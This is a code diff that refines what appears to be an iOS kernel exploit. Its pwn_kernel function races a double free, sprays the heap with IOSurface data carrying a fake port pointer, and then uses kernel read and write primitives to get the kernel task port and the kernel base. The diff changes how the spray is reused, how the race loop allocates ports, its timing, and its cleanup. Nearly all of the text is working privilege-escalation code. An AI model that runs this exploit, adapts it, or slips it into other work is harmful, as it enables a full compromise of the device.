@@ -183,38 +183,60 @@ static uint32_t transpose(uint32_t val)
     return ret + 0x01010101;
 }
 
+uint32_t *static_spray_data = NULL;
+
 uint32_t curr_highest_key = 0;
 uint32_t *get_me_some_spray_data(uint32_t surface_id, kport_t *fakeport, uint32_t *spray_count)
 {
-    uint32_t spray_qty = 10;
-    
+    const uint32_t spray_qty = 10;
     *spray_count = (8 + (spray_qty * 5)) * sizeof(uint32_t);
-    uint32_t *spray_data = malloc(*spray_count);
-    
-    uint32_t *spray_cur = spray_data;
-    *(spray_cur++) = surface_id;
-    *(spray_cur++) = 0x0;
-    *(spray_cur++) = kOSSerializeMagic;
-    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 3;
-    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | 2;
-    *(spray_cur++) = kOSSerializeSymbol | 4;
-    *(spray_cur++) = transpose(curr_highest_key++) & 0x00ffffff;
-    *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | spray_qty;
-    
-    for (int i = 1; i <= spray_qty; i++)
+
+    if (static_spray_data == NULL)
     {
-        *(spray_cur++) = (i == spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeData | 0x10;
+        LOG("initializing spray data...");
+
+        static_spray_data = malloc(*spray_count);
         
-        void *copy_to_here = spray_cur;
-        *(spray_cur++) = 0xaaaaaaaa;
-        *(spray_cur++) = 0xbbbbbbbb;
-        *(spray_cur++) = 0x00000000;
-        *(spray_cur++) = 0x00000000;
+        uint32_t *spray_cur = static_spray_data;
+        *(spray_cur++) = surface_id;
+        *(spray_cur++) = 0x0;
+        *(spray_cur++) = kOSSerializeMagic;
+        *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 3;
+        *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | 2;
+        *(spray_cur++) = kOSSerializeSymbol | 4;
+        *(spray_cur++) = transpose(curr_highest_key++) & 0x00ffffff;
+        *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | spray_qty;
         
-        memcpy(copy_to_here, &fakeport, sizeof(void *));
+        for (int i = 1; i <= spray_qty; i++)
+        {
+            *(spray_cur++) = (i == spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeData | 0x10;
+            
+            void *copy_to_here = spray_cur;
+            *(spray_cur++) = 0xaaaaaaaa;
+            *(spray_cur++) = 0xbbbbbbbb;
+            *(spray_cur++) = 0x00000000;
+            *(spray_cur++) = 0x00000000;
+            
+            memcpy(copy_to_here, &fakeport, sizeof(void *));
+        }
+
+        return static_spray_data;
     }
-    
-    return spray_data;
+
+    static_spray_data[6] = transpose(curr_highest_key++) & 0x00ffffff;
+
+    return static_spray_data;
+}
+
+void release_spray_data()
+{
+    if (static_spray_data == NULL)
+    {
+        return;
+    }
+
+    free(static_spray_data);
+    static_spray_data = NULL;
 }
 
 kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
@@ -223,9 +245,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kport_t *fakeport                   = NULL;
     pthread_t lio_listio_thread         = NULL;
     mach_port_t *port_buffer            = NULL;
+    mach_port_t the_one                 = MACH_PORT_NULL;
     mach_port_t notification_port       = MACH_PORT_NULL;
     mach_port_array_t maps              = NULL;
     mach_msg_type_number_t maps_num     = 0;
+    ool_message_struct ool_message, ool_message_recv;
     
     uint64_t receiver_addr              = 0,
     our_task_addr                       = 0,
@@ -300,7 +324,6 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     *port_buffer = MACH_PORT_NULL;
     
     // setup ool message
-    ool_message_struct ool_message, ool_message_recv;
     bzero(&ool_message, sizeof(ool_message));
     bzero(&ool_message_recv, sizeof(ool_message_recv));
     
@@ -328,13 +351,6 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
     fakeport->ip_srights = 99;
     
-    mach_port_t fucking_ports[80000];
-    for (int i = 0; i < 80000; i++)
-    {
-        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fucking_ports[i]);
-        mach_port_insert_right(mach_task_self(), fucking_ports[i], fucking_ports[i], MACH_MSG_TYPE_MAKE_SEND);
-    }
-    
     uint32_t spray_dictsz = 0x0, dummy = 0x0;
     size = sizeof(dummy);
     
@@ -344,10 +360,10 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     pthread_create(&lio_listio_thread, NULL, double_free, NULL);
     
     // race
-    mach_port_t the_one = MACH_PORT_NULL;
-    for (int i = 0; i < 80000; i++)
+    while (true)
     {
-        mach_port_t msg_port = fucking_ports[i];
+        mach_port_t msg_port = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &msg_port);
         
         // sending the message
         ool_message.head.msgh_remote_port = msg_port;
@@ -362,9 +378,9 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         ool_message_recv.head.msgh_local_port = msg_port;
         mach_msg(&ool_message_recv.head, MACH_RCV_MSG, 0, sizeof(ool_message_recv), msg_port, 0, 0);
         
-        free(spray_data);
-        
         mach_port_t *check_port = ool_message_recv.desc[0].address;
+        
+        mach_port_deallocate(mach_task_self(), msg_port);
         
         if (*check_port != MACH_PORT_NULL)
         {
@@ -374,13 +390,11 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
             the_one = *check_port;
             
             LOG("[!] found non-null port at 0x%x", the_one);
-            
+
             break;
         }
-        
+
         mach_msg_destroy(&ool_message_recv.head);
-        mach_port_deallocate(mach_task_self(), msg_port);
-        fucking_ports[i] = MACH_PORT_NULL;
     }
     
     if (the_one == MACH_PORT_NULL)
@@ -397,9 +411,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         uint32_t dummy = 0;
         size = sizeof(dummy);
         ret = IOConnectCallStructMethod(client, offsets.iosurface.set_value, spray_data, spray_dictsz, &dummy, &size);
-        
-        free(spray_data);
-        
+
         if (ret != KERN_SUCCESS)
         {
             LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
@@ -416,16 +428,6 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     }
     
     LOG("---> we out here!");
-    
-    for (int i = 0; i < 80000; i++)
-    {
-        if (fucking_ports[i] != the_one &&
-            MACH_PORT_VALID(fucking_ports[i]))
-        {
-            mach_port_destroy(mach_task_self(), fucking_ports[i]);
-            fucking_ports[i] = MACH_PORT_NULL;
-        }
-    }
     
     // allocate new port and assign it into port->ip_pdrequest to leak heap addr
     mach_port_t prev_port = MACH_PORT_NULL;
@@ -804,6 +806,8 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
     LOG("registered realhost->special[4]");
 
+    usleep(500000);
+
     // zero out old ports before overwriting
     for (int i = 0; i < 3; i++)
     {
@@ -813,7 +817,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
     LOG("wrote new port: %llx", new_port);
     
-    // usleep(500000);
+    usleep(500000);
     
     ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
     
@@ -859,7 +863,23 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     *kbase = kernel_base;
 
     ret = KERN_SUCCESS;
+
 out:;
+    LOG("allowing logs to propagate...");
+    sleep(1);
+
+    if (fakeport)
+    {
+        fakeport->ip_bits = 0x0;
+        fakeport->ip_kobject = 0x0;
+    }
+
+    if (MACH_PORT_VALID(the_one))
+    {
+        mach_port_deallocate(mach_task_self(), the_one);
+    }
+
+    release_spray_data();
     kdata_cleanup();
 
     return ret;
